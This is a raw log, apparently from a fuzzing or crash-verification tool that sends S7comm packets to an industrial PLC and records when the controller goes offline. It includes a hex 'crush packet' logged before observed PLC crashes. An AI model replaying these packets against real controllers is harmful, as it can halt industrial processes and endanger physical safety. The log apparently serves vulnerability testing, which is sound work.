[2021-12-19 20:31:14,099] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c500000800080001120411440100ff090004001c0000
[2021-12-19 20:31:14,303] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c600000800080001120411440100ff090004001c0000
[2021-12-19 20:31:14,506] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c700000800080001120411440100ff090004001c0000
[2021-12-19 20:31:14,710] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c800000800080001120411440100ff090004001c0000
[2021-12-19 20:31:14,916] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c900000800080001120411440100ff090004001c0000
[2021-12-19 20:31:15,123] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ca00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:15,339] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cb00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:15,546] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cc00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:15,749] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cd00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:15,952] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ce00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:16,156] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cf00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:16,361] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d000000800080001120411440100ff090004001c0000
[2021-12-19 20:31:16,565] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d100000800080001120411440100ff090004001c0000
[2021-12-19 20:31:16,770] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d200000800080001120411440100ff090004001c0000
[2021-12-19 20:31:16,975] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d300000800080001120411440100ff090004001c0000
[2021-12-19 20:31:17,180] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d400000800080001120411440100ff090004001c0000
[2021-12-19 20:31:17,386] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d500000800080001120411440100ff090004001c0000
[2021-12-19 20:31:17,610] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d600000800080001120411440100ff090004001c0000
[2021-12-19 20:31:17,811] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d700000800080001120411440100ff090004001c0000
[2021-12-19 20:31:18,017] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d800000800080001120411440100ff090004001c0000
[2021-12-19 20:31:18,223] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:31:18,225] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d900000800080001120411440100ff090004001c0000
[2021-12-19 20:31:18,427] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:31:30,456] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:31:30,457] [INFO] [vertifyPassiveARP.<module>] -> No: 3, sended packets 69 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:31:35,769] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:31:37,874] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000da0000080000f000000a000a00f0
[2021-12-19 20:31:37,875] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f08032030000da00000800000000f0000003000300f0
[2021-12-19 20:31:39,878] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 12
[2021-12-19 20:31:39,885] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000db00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:40,096] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:31:40,103] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:31:40,103] [INFO] [vertifyPassiveARP.<module>] -> No: 4, sended packets 1 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:31:40,104] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:31:40,105] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000dc00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:40,316] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000dd00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:40,520] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000de00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:40,722] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000df00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:40,926] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e000000800080001120411440100ff090004001c0000
[2021-12-19 20:31:41,133] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e100000800080001120411440100ff090004001c0000
[2021-12-19 20:31:41,339] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e200000800080001120411440100ff090004001c0000
[2021-12-19 20:31:41,544] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e300000800080001120411440100ff090004001c0000
[2021-12-19 20:31:41,750] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e400000800080001120411440100ff090004001c0000
[2021-12-19 20:31:41,955] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e500000800080001120411440100ff090004001c0000
[2021-12-19 20:31:42,161] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e600000800080001120411440100ff090004001c0000
[2021-12-19 20:31:42,613] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:31:42,615] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f08032010000e700000e00000401120a10010003000083000001
[2021-12-19 20:31:42,823] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e800000800080001120411440100ff090004001c0000
[2021-12-19 20:31:43,028] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e900000800080001120411440100ff090004001c0000
[2021-12-19 20:31:43,234] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ea00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:43,439] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000eb00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:43,643] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ec00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:43,846] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ed00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:44,049] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ee00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:44,254] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ef00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:44,457] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f000000800080001120411440100ff090004001c0000
[2021-12-19 20:31:44,665] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f100000800080001120411440100ff090004001c0000
[2021-12-19 20:31:44,882] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f200000800080001120411440100ff090004001c0000
[2021-12-19 20:31:45,090] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f300000800080001120411440100ff090004001c0000
[2021-12-19 20:31:45,296] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f400000800080001120411440100ff090004001c0000
[2021-12-19 20:31:45,499] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f500000800080001120411440100ff090004001c0000
[2021-12-19 20:31:45,705] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f600000800080001120411440100ff090004001c0000
[2021-12-19 20:31:45,910] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f700000800080001120411440100ff090004001c0000
[2021-12-19 20:31:46,114] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f800000800080001120411440100ff090004001c0000
[2021-12-19 20:31:46,319] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f900000800080001120411440100ff090004001c0000
[2021-12-19 20:31:46,524] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fa00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:46,729] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fb00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:46,934] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fc00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:47,138] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fd00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:47,343] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fe00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:47,547] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ff00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:47,752] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000001000800080001120411440100ff090004001c0000
[2021-12-19 20:31:47,958] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000101000800080001120411440100ff090004001c0000
[2021-12-19 20:31:48,162] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000201000800080001120411440100ff090004001c0000
[2021-12-19 20:31:48,225] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:31:48,365] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:32:00,393] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:32:00,393] [INFO] [vertifyPassiveARP.<module>] -> No: 4, sended packets 40 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:32:05,640] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:32:07,315] [ERROR] [verifyClient.send_receive_packet] -> file descriptor cannot be a negative integer (-1)
[2021-12-19 20:32:07,318] [ERROR] [verifyClient.send_receive_s7_packet] -> file descriptor cannot be a negative integer (-1)
[2021-12-19 20:32:09,332] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 32
[2021-12-19 20:32:09,333] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:32:09,549] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:32:09,558] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:32:09,558] [INFO] [vertifyPassiveARP.<module>] -> No: 5, sended packets 1 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:32:09,559] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:32:09,560] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:32:09,772] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:32:09,977] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:32:10,182] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:32:10,388] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:32:10,594] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:32:10,800] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
